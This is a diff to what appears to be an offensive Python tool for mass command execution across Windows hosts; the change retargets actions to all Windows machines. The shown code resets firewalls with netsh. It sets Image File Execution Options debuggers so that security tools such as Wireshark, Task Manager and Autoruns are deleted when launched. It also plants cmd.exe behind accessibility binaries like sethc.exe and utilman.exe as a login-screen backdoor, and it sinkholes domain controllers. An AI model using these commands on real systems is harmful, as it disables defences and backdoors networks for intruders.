@@ -36,7 +36,7 @@ def main():
             shell_execution(selected_ip)
         elif action == "FIREWALL":
             command = "netsh advfirewall reset"
-            mass_execution(command)
+            mass_execution(command, targets=CONFIG.hosts.ALL_WINDOWS)
         elif action == "IFEO":
             target_processes = (
                 "wireshark.exe", "taskmgr.exe", "autoruns.exe", "autoruns64.exe",
@@ -50,7 +50,7 @@ def main():
                 f"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%i\" "
                 f"/v Debugger /t REG_SZ /d \"cmd.exe /c del /f /q \"%i\"\" /f"
             )
-            mass_execution(command)
+            mass_execution(command, targets=CONFIG.hosts.ALL_WINDOWS)
         elif action == "UTILITY":
             target_processes = (
                 "sethc.exe", "utilman.exe", "osk.exe", "displayswitch.exe",
@@ -66,7 +66,7 @@ def main():
                 f"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%i\" "
                 f"/v Debugger /t REG_SZ /d cmd.exe /f"
             )
-            mass_execution(command)
+            mass_execution(command, targets=CONFIG.hosts.ALL_WINDOWS)
         elif action == "SSH":
             print("SSH Key Dropping coming soon!")
         elif action == "SINKHOLE":
@@ -83,7 +83,7 @@ def main():
                 )
                 full_command += command
             full_command = full_command[:-2]
-            mass_execution(full_command, targets=CONFIG.hosts.ALL_DC)
+            mass_execution(full_command, targets=CONFIG.hosts.ALL_WINDOWS_DC)
         elif action == "CALLBACK":
             command = "whoami"
             mass_execution(command, callback=True)
